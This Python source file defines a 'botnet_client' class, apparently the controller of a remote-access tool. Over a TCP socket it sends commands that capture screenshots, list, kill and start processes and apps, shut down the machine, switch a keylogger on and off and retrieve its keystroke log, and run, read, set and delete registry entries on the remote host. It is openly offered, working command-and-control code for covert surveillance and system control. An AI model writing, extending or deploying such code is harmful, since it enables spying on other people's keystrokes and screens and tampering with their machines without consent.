import socket
import io
import PIL.Image
import time
import json
from utils import *

HOST = '127.0.0.1'  # The default server's hostname or IP address
PORT = 26101  # The default port used by the server
class botnet_client:
#-------------------PRIVATE AREA-------------------
    def __init__(self, host = HOST, port = PORT):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
#-------------------PUBLIC AREA-------------------
    def set(self, host = HOST, port = PORT):
        self.host = host
        self.port = port
        
    def connect(self):
        try:
            self.server.connect((self.host, self.port)) # connection socket
            self.server = socket_adapter(self.server)
            return "Connected successfully!"
        except:
            return "Connected failed!"
    
    def close_connect(self):
        try:
            self.server.send(b"QUIT")
            self.server.close()
        except:
            pass
    
    # get screenshot of botnet
    def get_screenshot(self):
        self.server.send(b"PIC")
        # receive data
        data = self.server.recv()
        # write data to image
        image = PIL.Image.open(io.BytesIO(data))
        ok = self.server.recv()
        return image

    # get list of running process of botnet
    def get_list_process(self):
        self.server.send(b"PROC")
        json_procs = self.server.recv().decode('utf-8')
        procs = json.loads(json_procs)
        ok = self.server.recv()
        return procs

    # kill process of botnet by pid
    # return string (successful/failed)
    def kill_process(self, pid):
        cmd = "KILLPROC {}".format(str(pid))
        self.server.send(cmd.encode('utf-8'))
        ok = self.server.recv()
        if (ok != b'0'):
            return "Killed process at pid {0} successully!".format(pid)
        else:
            return "Killed process at pid {0} failed!".format(pid)
        
    # start process of botnet by name
    def start_process(self, name):
        cmd = "STARTPROC {}".format(name)
        self.server.send(cmd.encode('utf-8'))
        ok = self.server.recv()
        if (ok != b'0'):
            return "Start process with name {0} successully!".format(name)
        else:
            return "Start process with name {0} failed!".format(name)

    # get list of running app of botnet
    def get_list_app(self):
        self.server.send(b"APP")
        json_apps = self.server.recv().decode('utf-8')
        apps = json.loads(json_apps)
        ok = self.server.recv()
        return apps

    # kill app of botnet by pid
    # return string (successful/failed)
    def kill_app(self, pid):
        cmd = "KILLAPP {}".format(str(pid))
        self.server.send(cmd.encode('utf-8'))
        ok = self.server.recv()
        if (ok != b'0'):
            return "Killed process at pid {0} successully!".format(pid)
        else:
            return "Killed process at pid {0} failed!".format(pid)
        
    # start app of botnet by name
    def start_app(self, name):
        cmd = "STARTAPP {}".format(name)
        self.server.send(cmd.encode('utf-8'))
        ok = self.server.recv()
        if (ok != b'0'):
            return "Start app with name {0} successully!".format(name)
        else:
            return "Start app with name {0} failed!".format(name)
    
    # shut down server
    def shutdown(self):
        self.server.send(b"SHUTDOWN")
        ok = self.server.recv()
        if (ok != b'0'):
            return "Shutdown server successfully!"
        else:
            return "Shutdown server failed!"
    
    # start hook key
    def hook_key(self):
        self.server.send(b"HOOK")
        ok = self.server.recv()
        if (ok != b'0'):
            return "Hook key successfully!"
        else:
            return "Hook key failed!"
    
    # end hook key
    def unhook_key(self):
        self.server.send(b"UNHOOK")
        ok = self.server.recv()
        if (ok != b'0'):
            return "Unhook key successfully!"
        else:
            return "Unhook key failed!"
    
    # get key log of server
    def get_key_log(self):
        self.server.send(b"KEYLOG")
        data = self.server.recv().decode("utf-8")
        ok = self.server.recv()
        return data

    # send registry file to server
    def send_reg_text(self, reg_txt):
        self.server.send(b"REGFILE")
        self.server.send(reg_txt.encode('utf-8'))
        ok = self.server.recv()
        if (ok != b'0'):
            return "Execute registry file successfully!"
        else:
            return "Execute registry file failed!"
    
    # send refistry command to server
    def send_reg_cmd(self, cmd_type, path, val_name, val, val_type):
        tokens_reg = [cmd_type, path, val_name, val, val_type]
        cmd = "REGCMD {}\\r\\n{}\\r\\n{}\\r\\n{}\\r\\n{}".format(*tokens_reg)
        self.server.send(cmd.encode('utf-8'))

        if (cmd_type == "GETVAL"):
            val = self.server.recv().decode('utf-8')
        
        ok = self.server.recv()
        if (ok != b'0'):
            if (cmd_type == "GETVAL"):
                return val_name + " = " + val + "\n"
            elif (cmd_type == "SETVAL"):
                return "Set value successfully!\n"
            elif (cmd_type == "DELVAL"):
                return "Delete value successfully!\n"
            elif (cmd_type == "CREKEY"):
                return "Create key successfully!\n"
            elif (cmd_type == "DELKEY"):
                return "Delete key successfully!\n"
            else:
                return "Wrong registry command!\n"
        else:
            return "Failed to modify registry!\n"